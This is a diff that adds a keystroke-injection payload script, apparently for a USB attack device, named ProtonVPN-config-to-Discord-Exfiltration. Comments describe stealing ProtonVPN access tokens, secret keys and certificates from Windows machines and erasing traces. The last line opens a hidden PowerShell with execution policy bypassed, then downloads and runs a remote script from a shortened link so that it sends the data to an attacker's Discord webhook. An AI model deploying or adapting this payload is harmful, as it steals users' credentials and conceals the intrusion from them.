@@ -1,0 +1,34 @@
+REM ###################################################################
+REM #                                                                 |
+REM # Title        : ProtonVPN-config-to-Discord-Exfiltration         |
+REM # Author       : Aleff                                            |
+REM # Version      : 1.0                                              |
+REM # Category     : Credentials, Exfiltration                        |
+REM # Target       : Windows 10-11                                    |
+REM #                                                                 |
+REM ###################################################################
+
+REM Title: ProtonVPN-config-to-Discord-Exfiltration
+REM Author: Aleff
+REM Description: Opens PowerShell hidden, grabs ProtonVPN config file, saves as a cleartext in a variable and exfiltrates info via Discord Webhook.
+REM              In the config file you can find a lot information about the user like:
+REM              - UserUid 
+REM              - UserAccessToken
+REM              - UserRefreshToken
+REM              - UserAuthenticationPublicKey
+REM              - UserAuthenticationSecretKey
+REM              - UserAuthenticationCertificatePem
+REM              - UserCertificationServerPublicKey 
+REM              - and so on...
+REM              Then it cleans up traces of what you have done after.
+REM Target: Windows 10-11 (PowerShell + ProtonVPN software)
+REM Version: 1.0
+REM Category: Credentials, Exfiltration
+REM Requirements: ProtonVPN user logged at least one time and internet connection
+REM 
+
+
+DELAY 2000
+GUI r
+DELAY 250
+STRINGLN powershell -w h -ep bypass $discord='<your-wehbook-here>';irm bit.ly/ProtonVPN-config-raw | iex
